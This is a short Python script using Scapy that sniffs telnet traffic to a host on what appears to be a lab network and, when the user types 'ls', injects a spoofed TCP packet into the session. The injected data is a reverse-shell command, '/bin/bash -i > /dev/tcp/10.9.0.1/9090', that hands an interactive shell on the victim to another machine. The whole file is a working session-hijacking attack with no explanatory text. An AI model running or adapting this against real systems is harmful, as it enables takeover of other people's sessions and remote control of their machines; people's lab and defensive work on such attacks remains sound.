from scapy.all import *

buffer = ""

def SessionHijacking(pkt):
    global buffer
    
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load
        char = payload.decode('utf-8', errors='ignore')
        buffer += char
        
        if '\r' in buffer:
            if "ls" in buffer.strip():
                ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
                seq = pkt[TCP].seq 
                tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=seq, ack=pkt[TCP].ack)
                
                data = "  /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"
                pkt = ip/tcp/data
                ls(pkt)
                send(pkt, verbose=0)
            
            # reset buffer
            buffer = ""

sniff(iface="br-72d37eb380a2", filter="tcp and dst host 10.9.0.6 and dst port 23", prn=SessionHijacking)